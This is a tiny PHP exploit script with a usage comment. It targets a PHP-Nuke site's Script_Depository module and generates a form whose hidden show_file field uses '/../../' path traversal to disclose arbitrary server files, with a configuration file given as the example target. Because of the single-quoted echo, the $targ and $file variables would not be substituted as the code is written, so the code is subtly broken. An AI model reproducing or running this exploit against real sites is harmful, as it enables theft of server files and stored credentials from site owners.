<?
/*
Usage: 31337.php?targ=http://[target]/[phpnuke_path]&file=[file]
Example: 31337.php?targ=http://www.example.com/phpnuke&file=conf/settings.php
*/
$targ = $_GET['targ'];
$file = $_GET['file'];
echo '
<form action="$targ/modules.php?name=Script_Depository" method="post">
<input name="show_file" value="/../../$file" type="hidden">
<input value="show_file" name="op" type="hidden">
<input type="submit" value="Show Source">
</form>';
?>
